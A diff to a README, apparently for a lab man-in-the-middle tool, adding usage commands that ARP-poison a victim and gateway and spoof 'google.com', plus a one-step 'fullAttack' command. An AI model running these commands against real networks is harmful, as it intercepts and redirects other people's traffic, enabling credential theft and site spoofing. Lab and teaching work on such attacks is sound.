@@ -18,7 +18,7 @@ Clear ARP table: `sudo ip -s -s neigh flush all`
 
 # Run steps separately:
 1. ARP poison the victim: 
-`sudo python3 main.py --interface "enp0s10" arpPoison --ipVictim "10.0.123.5" --macVictim "08:00:27:23:55:6e" --ipToSpoof "10.0.123.1"`
+`sudo python3 main.py --interface "enp0s10" arpPoison --ipVictim "10.0.123.5" --ipToSpoof "10.0.123.1"`
 
 2. ARP poison the gateway: 
 `sudo python3 main.py --interface "enp0s10" arpPoison --ipVictim "10.0.123.1" --ipToSpoof "10.0.123.5"`
@@ -31,3 +31,9 @@ Clear ARP table: `sudo ip -s -s neigh flush all`
 ### 1. Determine the PID of the process: sudo lsof -i :80
 ### 2. Kill the process: sudo kill -9 <PID>
 5. Forward `sudo python3 main.py --interface "enp0s10" forward --ipVictim "10.0.123.5" --siteToSpoof "google.com"`
+
+# Or Run the full attack at once:
+### For the forwarder to work we must first terminate the webserver that is running by default on the attacker machine.
+### 1. Determine the PID of the process: sudo lsof -i :80
+### 2. Kill the process: sudo kill -9 <PID>
+1. `sudo python3 main.py --interface "enp0s10" fullAttack --ipVictim "10.0.123.5" --ipGateway "10.0.123.1" --siteToSpoof "google.com"`
